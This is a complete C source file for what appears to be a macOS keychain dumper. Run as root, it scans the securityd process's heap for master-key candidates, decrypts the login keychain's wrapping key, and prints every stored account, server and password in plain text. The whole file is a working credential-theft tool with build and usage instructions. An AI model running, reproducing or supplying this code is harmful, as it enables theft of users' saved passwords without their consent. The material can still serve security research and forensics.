// Build instructions:
// $ gcc keychaindump.c -o keychaindump -lcrypto

// Usage:
// $ sudo ./keychaindump [path to keychain file, leave blank for default]

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <openssl/des.h>
#include <sys/sysctl.h>

// This structure's fields are pieced together from several sources,
// using the label as an identifier. See find_or_create_credentials.
typedef struct t_credentials {
    char label[20];
    char iv[8];
    char key[24];
    size_t ciphertext_len;
    char *ciphertext;
    char *server;
    char *account;
    char *password;
} t_credentials;

// Lazy limits to avoid reallocing / having to code fancy data storage.
#define MAX_CREDENTIALS 2048
#define MAX_MASTER_CANDIDATES 1024

t_credentials *g_credentials = 0;
int g_credentials_count = 0;
char **g_master_candidates = 0;
int g_master_candidates_count = 0;

// Writes a hex representation of the bytes in src to the dst buffer.
// The dst buffer must be at least len*2+1 bytes in size.
void hex_string(char *dst, char *src, size_t len) {
    int i;
    for (i = 0; i < len; ++i) {
        sprintf(dst+i*2, "%02x", (unsigned char)src[i]);
    }
}

// Saves a 24-byte sequence that might be a valid master key in the
// global list. Checks the existing list first to avoid duplicates.
void add_master_candidate(char *key) {
    if (!g_master_candidates) {
        g_master_candidates = malloc(MAX_MASTER_CANDIDATES * sizeof(char *));
    }
    
    // Key already known?
    int i;
    for (i = 0; i < g_master_candidates_count; ++i) {
        if (!memcmp(key, g_master_candidates[i], 24)) return;
    }
    
    if (g_master_candidates_count < MAX_MASTER_CANDIDATES) {
        char *new = malloc(24);
        memcpy(new, key, 24);
        g_master_candidates[g_master_candidates_count++] = new;
    } else {
        printf("[-] Too many candidate keys to fit in memory\n");
        exit(1);
    }
}

// Enumerates the system's process list to find the PID of securityd.
int get_securityd_pid() {
    int mib[] = {CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0};
    
    size_t sz;
    sysctl(mib, 4, NULL, &sz, NULL, 0);

    struct kinfo_proc *procs = malloc(sz);
    sysctl(mib, 4, procs, &sz, NULL, 0);

    int proc_count = sz / sizeof(struct kinfo_proc);
    int i, pid = 0;
    for (i = 0; i < proc_count; ++i) {
        struct kinfo_proc *proc = &procs[i];
        if (!strcmp("securityd", proc->kp_proc.p_comm)) {
            pid = proc->kp_proc.p_pid;
            break;
        }
    }
    
    free(procs);
    return pid;
}

// Searches a memory range for anything that looks like a master encryption key
// and stores each found candidate in the global list of possible master keys.
void search_for_keys_in_task_memory(mach_port_name_t task, vm_address_t start, vm_address_t stop) {
    size_t sz = stop - start;
    char *buffer = malloc(sz);
    if (!buffer) {
        printf("[-] Could not allocate memory for key search\n");
        exit(1);
    }
    
    size_t read_sz;
    
    kern_return_t r = vm_read_overwrite(task, start, sz, (vm_address_t)buffer, &read_sz);
    if (sz != read_sz) printf("[-] Requested %lu bytes, got %lu bytes\n", sz, read_sz);

    if (r == KERN_SUCCESS) {
        int i;
        for (i = 0; i < read_sz - sizeof(unsigned long int); i += 4) {
            unsigned long int *p = (unsigned long int *)(buffer + i);
            
            // Look for an 8-byte size field with value 0x18, followed by an 8-byte
            // pointer to the same memory range we are currently inspecting. Use
            // the value the pointer points to as a candidate master key.
            if (*p == 0x18) {
                vm_address_t address = *(p + 1);
                if (address >= start && address <= stop) {
                    char key[24 + 1];
                    key[24] = 0;
                    memcpy(key, buffer + address - start, 24);
                    add_master_candidate(key);
                }
            }
        }
    } else {
        printf("[-] Error (%i) reading task memory @ %p\n", r, (void *)start);
    }
    
    free(buffer);
}

// Uses vmmap to enumerate memory ranges where the keys might be hidden
// and then searches each range individually for candidate master keys.
void search_for_keys_in_process(int pid) {
    mach_port_name_t task;
    task_for_pid(current_task(), pid, &task);
    
    char cmd[128];
    snprintf(cmd, 128, "vmmap %i", pid);
    
    FILE *p = popen(cmd, "r");
    
    char line[512];
    vm_address_t start, stop;
    while (fgets(line, 512, p)) {
        if(sscanf(line, "MALLOC_TINY %lx-%lx", &start, &stop) == 2) {
            printf("[*] Searching process %i heap range 0x%lx-0x%lx\n", pid, start, stop);
            search_for_keys_in_task_memory(task, start, stop);
        }
    }
    
    pclose(p);
}

// Returns an Apple Database formatted 32-bit integer from the given address.
int atom32(char *p) {
    return ntohl(*(int *)p);
}

// Returns (creates, if necessary) a credentials struct for the given label.
t_credentials *find_or_create_credentials(char *label) {
    if (!g_credentials) {
        size_t sz = MAX_CREDENTIALS * sizeof(t_credentials);
        g_credentials = malloc(sz);
        memset(g_credentials, 0, sz);
    }
    
    int i;
    for (i = 0; i < g_credentials_count; ++i) {
        if (!memcmp(label, g_credentials[i].label, 20)) {
            return &g_credentials[i];
        }
    }
    
    if (g_credentials_count < MAX_CREDENTIALS) {
        t_credentials *new = &g_credentials[g_credentials_count++];
        memcpy(new->label, label, 20);
        return new;
    } else {
        printf("[-] Too many credentials to fit in memory\n");
        exit(1);
    }
}

// Returns 0 for invalid padding, otherwise [1, 8].
size_t check_3des_plaintext_padding(char *plaintext, size_t len) {
    char pad = plaintext[len-1];
    if (pad < 1 || pad > 8) return 0;
    
    int i;
    for (i = 1; i < pad; ++i) {
        if (plaintext[len-1-i] != pad) return 0;
    }
    
    return (size_t)pad;
}

// Returns 0 for invalid data, otherwise length of unpadded plaintext.
// The unpadded plaintext (if valid) is written to the "out" buffer.
size_t decrypt_3des(char *in, size_t len, char *out, char *key, char* iv) {
    DES_cblock ckey1, ckey2, ckey3, civ;
    DES_key_schedule ks1, ks2, ks3;

    memcpy(civ, iv, 8);
    memcpy(ckey1, &key[0], 8);
    memcpy(ckey2, &key[8], 8);
    memcpy(ckey3, &key[16], 8);
    DES_set_key((C_Block *)ckey1, &ks1);
    DES_set_key((C_Block *)ckey2, &ks2);
    DES_set_key((C_Block *)ckey3, &ks3);
    
    char *padded = malloc(len);
    DES_ede3_cbc_encrypt((unsigned char *)in, (unsigned char *)padded, len, &ks1, &ks2, &ks3, &civ, DES_DECRYPT);
    
    size_t out_len = 0;
    size_t padding = check_3des_plaintext_padding(padded, len);
    if (padding > 0) {
        out_len = len - padding;
        memcpy(out, padded, out_len);
    }
    free(padded);
    return out_len;
}

// Attempts to decrypt the file's wrapping key with the given master key.
// Returns 0 if unsuccessful, 24 otherwise. The decrypted key is written
// to the "out" buffer, if valid. May produce false positives, as the
// 3DES padding is not a 100% reliable way to check validity.
int dump_wrapping_key(char *out, char *master, char *buffer, size_t sz) {
    char magic[] = "\xfa\xde\x07\x11";
    int offset;
    
    // Instead of parsing the keychain file, just look for the last
    // blob identified by the magic number and assume it is a DbBlob
    for (offset = sz-4; offset >= 0; offset -= 4) {
        if (!strncmp(magic, buffer + offset, 4)) break;
    }
    if (offset == 0) {
        printf("[-] Could not find DbBlob\n");
        exit(1);
    }
    char *blob = buffer + offset;
    
    char iv[8];
    memcpy(iv, blob + 64, 8);
    
    char key[48];
    int ciphertext_offset = atom32(blob + 8);
    size_t key_len = decrypt_3des(blob + ciphertext_offset, 48, key, master, iv);
    
    if (!key_len) return 0;
    
    memcpy(out, key, 24);
    return 24;
}

// Decrypts the password encryption key from an individual KeyBlob into
// the global credentials list.
void dump_key_blob(char *key, char *blob) {
    int ciphertext_offset = atom32(blob + 8);
    int blob_len = atom32(blob + 12);
    char iv[8];
    memcpy(iv, blob + 16, 8);

    // The label is actually an attribute after the KeyBlob
    char label[20];
    memcpy(label, blob + blob_len + 8, 20);
    
    if (strncmp(label, "ssgp", 4)) return;
    
    int ciphertext_len = blob_len - ciphertext_offset;
    
    if (ciphertext_len != 48) return;
    
    // Decrypt the obfuscation IV layer 
    char tmp[48];
    char obfuscationIv[] = "\x4a\xdd\xa2\x2c\x79\xe8\x21\x05";
    size_t tmp_len = decrypt_3des(blob + ciphertext_offset, 48, tmp, key, obfuscationIv);

    // Reverse the fist 32 bytes
    int i;
    char reverse[32];
    for (i = 0; i < 32; ++i) {
        reverse[31 - i] = tmp[i];
    }
    
    // Decrypt the real IV layer
    tmp_len = decrypt_3des(reverse, 32, tmp, key, iv);
    if (tmp_len != 28) return;
    
    // Discard the first 4 bytes
    t_credentials *cred = find_or_create_credentials(label);
    memcpy(cred->key, tmp + 4, 24);
}

// Extracts the encrypted password and the srvr & acct attributes from
// the (probably table 8) record into the global credentials list.
void dump_credentials_data(char *record) {
    int record_sz = atom32(record + 0);
    int data_sz = atom32(record + 16);
    
    // No attributes?
    if (record_sz == 24 + data_sz) return;

    int first_attribute_offset = atom32(record + 24) & 0xfffffffe;
    int data_offset = first_attribute_offset - data_sz;
    int attribute_count = (data_offset - 24) / 4;
    
    // The correct table (8) has 20 attributes
    if (attribute_count != 20) return;
    
    char *data = record + data_offset;
    
    size_t ciphertext_len = data_sz - 20 - 8;
    if (ciphertext_len < 8) return;
    if (ciphertext_len % 8 != 0) return;

    char label[20];
    char iv[8];
    char *ciphertext = malloc(ciphertext_len);
    
    memcpy(label, data + 0, 20);
    memcpy(iv, data + 20, 8);
    memcpy(ciphertext, data + 28, ciphertext_len);
    
    t_credentials *cred = find_or_create_credentials(label);
    memcpy(cred->iv, iv, 8);
    cred->ciphertext = ciphertext;
    cred->ciphertext_len = ciphertext_len;
    
    // Attributes 13 and 15
    int srvr_attribute_offset = atom32(record + 24 + 15*4) & 0xfffffffe;
    int acct_attribute_offset = atom32(record + 24 + 13*4) & 0xfffffffe;
    char *srvr_attribute = record + srvr_attribute_offset;
    char *acct_attribute = record + acct_attribute_offset;
    int srvr_len = atom32(srvr_attribute + 0);
    int acct_len = atom32(acct_attribute + 0);
    
    if (!srvr_len || !acct_len) return;
    
    char *srvr = malloc(srvr_len + 1);
    char *acct = malloc(acct_len + 1);
    memset(srvr, 0, srvr_len + 1);
    memset(acct, 0, acct_len + 1);
    memcpy(srvr, srvr_attribute + 4, srvr_len);
    memcpy(acct, acct_attribute + 4, acct_len);
    
    cred->server = srvr;
    cred->account = acct;
}

// Parses the keychain file (Apple Database) and traverses each record
// in each table, looking for two kinds of records: KeyBlobs and
// credentials data. The KeyBlobs contain encryption keys for each
// individual password ciphertext. The credentials data records contain
// the password ciphertexts and their IVs, as well as  account and
// server attributes. The KeyBlobs are probably in table 6, and the
// credentials data records in table 8.
void dump_keychain(char *key, char *buffer) {
    int i, j;
    
    if (strncmp(buffer, "kych", 4)) {
        printf("[-] The target file is not a keychain file\n");
        return;
    }
    
    int schema_offset = atom32(buffer + 12);
    char *schema = buffer + schema_offset;
    
    // Traverse each table
    int table_count = atom32(schema + 4);
    for (i = 0; i < table_count; ++i) {
        int table_offset = atom32(schema + 8 + i*4);
        char *table = schema + table_offset;
        
        // Traverse each record
        int record_count = atom32(table + 8);
        for (j = 0; j < record_count; ++j) {
            int record_offset = atom32(table + 28 + j*4);
            char *record = table + record_offset;
            
            // Calculate the start of the data section
            int record_sz = atom32(record + 0);
            int data_sz = atom32(record + 16);
            int data_offset = 24;
            if (record_sz > 24 + data_sz) {
                int first_attribute_offset = atom32(record + 24) & 0xfffffffe;
                data_offset = first_attribute_offset - data_sz;
            }
            char *data = record + data_offset;
            
            int magic = atom32(data + 0);
            
            if (magic == 0xfade0711) {
                dump_key_blob(key, data);
            } else if (magic == 0x73736770) {
                dump_credentials_data(record);
            }
        }
    }
}

// Uses the information in the global credentials list to decrypt the
// password ciphertexts. Each set of credentials requires its own IV,
// key, and ciphertext for the decryption to work.
void decrypt_credentials() {
    if (!g_credentials) return;
    
    int i;
    for (i = 0; i < g_credentials_count; ++i) {
        t_credentials *cred = &g_credentials[i];
        if (!cred->ciphertext) continue;
        
        char *tmp = malloc(cred->ciphertext_len);
        size_t tmp_len = decrypt_3des(cred->ciphertext, cred->ciphertext_len, tmp, cred->key, cred->iv);
        if (tmp_len) {
            cred->password = malloc(tmp_len + 1);
            cred->password[tmp_len] = 0;
            memcpy(cred->password, tmp, tmp_len);
        }
        free(tmp);
    }
}

// Outputs all credentials in "account:server:password" format. Call
// after all the data has been dumped and the passwords decrypted.
void print_credentials() {
    if (!g_credentials) return;
    
    int i;
    for (i = 0; i < g_credentials_count; ++i) {
        t_credentials *cred = &g_credentials[i];
        if (!cred->account && !cred->server) continue;
        if (!strcmp(cred->account, "Passwords not saved")) continue;
        printf("%s:%s:%s\n", cred->account, cred->server, cred->password);
    }
}

int main(int argc, char **argv) {
    // Phase 1. Search securityd's memory space for possible master keys.
    // If the keychain file is unlocked, the real key should be in memory.
    int pid = get_securityd_pid();
    if (!pid) {
        printf("[-] Could not find the securityd process\n");
        exit(1);
    }
    
    if (geteuid()) {
        printf("[-] No root privileges, please run with sudo\n");
        exit(1);
    }
    
    search_for_keys_in_process(pid);
    
    printf("[*] Found %i master key candidates\n", g_master_candidates_count);
    
    if (!g_master_candidates_count) exit(1);
    
    // Phase 2. Try decrypting the wrapping key with each master key candidate
    // to see which one gives a valid result.
    char filename[512];
    if (argc < 2) {
        sprintf(filename, "%s/Library/Keychains/login.keychain", getenv("HOME"));
    } else {
        sprintf(filename, "%s", argv[1]);
    }
    
    FILE *f = fopen(filename, "rb");
    if (!f) {
        printf("[-] Could not open %s\n", filename);
        exit(1);
    }
    
    fseek(f, 0, SEEK_END);
    size_t sz = ftell(f);
    char *buffer = malloc(sz);
    rewind(f);
    fread(buffer, 1, sz, f);
    fclose(f);
    
    printf("[*] Trying to decrypt wrapping key in %s\n", filename);

    char key[24];
    int i, key_len = 0;
    for (i = 0; i < g_master_candidates_count; ++i) {
        char s_key[24*2+1];
        hex_string(s_key, g_master_candidates[i], 24);
        printf("[*] Trying master key candidate: %s\n", s_key);
        if (key_len = dump_wrapping_key(key, g_master_candidates[i], buffer, sz)) {
            printf("[+] Found master key: %s\n", s_key);
            break;
        }
    }
    if (!key_len) {
        printf("[-] None of the master key candidates seemed to work\n");
        exit(1);
    }

    char s_key[24*2+1];
    hex_string(s_key, key, 24);
    printf("[+] Found wrapping key: %s\n", s_key);
    
    // Phase 3. Using the wrapping key, dump all credentials from the keychain
    // file into the global credentials list and decrypt everything.
    dump_keychain(key, buffer);
    decrypt_credentials();
    print_credentials();
    
    free(buffer);
    return 0;
}
